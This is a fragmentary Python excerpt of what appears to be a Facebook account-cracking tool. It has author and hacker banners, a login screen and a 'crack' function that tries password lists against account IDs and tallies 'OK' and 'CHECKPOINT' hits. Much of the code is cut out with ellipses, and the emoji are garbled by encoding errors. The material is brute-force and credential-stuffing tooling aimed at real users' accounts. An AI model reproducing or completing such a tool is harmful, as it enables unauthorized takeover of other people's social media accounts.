...
def banner():
	clear()
	sol()
	ban=''' Â© RAFU🥵 NAME TO SHUNAI HUGA🤖
  
  [â€¢] MR ELESH👨‍💻
  
[â€¢] Facebook: Md. Sabbir Hossain Rafi🥵

 [â€¢] MASTER MIND OF HACKERðŸ¥ºâ¤ï¸                                      '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             WELLCOME : [green]ELESH THE BRAND🤖[purple] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RAFU-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     âœ¨ RAFU-CHECKPOINT âœ¨ [red]'))
				...
				cetak(nel('[green]      â¤ï¸âœ¨ RAFU-OK😍 â¤ï¸âœ¨[green]')) 
